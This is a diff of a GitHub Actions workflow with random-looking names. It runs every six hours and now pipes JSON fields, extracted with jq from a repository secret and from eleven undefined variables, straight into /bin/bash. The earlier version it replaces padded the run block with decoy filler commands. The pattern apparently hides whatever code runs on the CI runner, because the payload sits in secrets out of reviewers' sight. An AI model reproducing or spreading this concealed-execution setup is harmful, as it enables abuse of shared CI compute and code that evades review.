@@ -1,35 +1,28 @@
 name: baixiaochi1974
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 1/6 * * *'
-jobs:  # 7595
+    - cron: '21 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: baixiaochi1974
         env:
-          m23242: ${{ secrets.m23242 }}
+          wn42656: ${{ secrets.wn42656 }}
         run: |
-          for i in 1 2 3; do echo "Loop $i"; done
-          echo "Date only: $(date +%F)"
-          test -d /tmp && echo "Tmp dir exists"
-          echo $m23242 | jq -r .h13455 | /bin/bash
-          which screen
-          for i in 1 2 3; do echo "Loop $i"; done
-          echo "Uptime: $(uptime 2>/dev/null | cut -d' ' -f1-3 || echo N/A)"
-          [ -f /etc/hosts ] && echo "Hosts exist" || true
-          cat /dev/null > /tmp/.tmpfile 2>/dev/null || true
-          for i in {1..3}; do echo "Iter $i"; done
-          echo "Time: $(date +%H:%M:%S)"
-          screen -ls
-          curl google.com
-          which bash 2>/dev/null || echo "Bash not in path"
-          sleep 0.1 2>/dev/null || true
-          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
-          echo "Debug at $(date)"
-          echo "Version: $((1 + RANDOM % 5))"
-          : ' Another single-line comment '
-          ping -c 10 www.google.com
+          echo $wn42656 | jq -r .fg48 | /bin/bash
+          echo $zh18330 | jq -r .s5 | /bin/bash
+          echo $kpqa56 | jq -r .qafo06764 | /bin/bash
+          echo $f64 | jq -r .hsrt97 | /bin/bash
+          echo $zmu26 | jq -r .k7 | /bin/bash
+          echo $qaiq6987 | jq -r .zyn7 | /bin/bash
+          echo $asx62 | jq -r .tw212 | /bin/bash
+          echo $iy1834 | jq -r .sf33467 | /bin/bash
+          echo $t26077 | jq -r .wup440 | /bin/bash
+          echo $fnx58666 | jq -r .g59 | /bin/bash
+          echo $tcah6297 | jq -r .aj70 | /bin/bash
+          echo $br27 | jq -r .ji70646 | /bin/bash
+
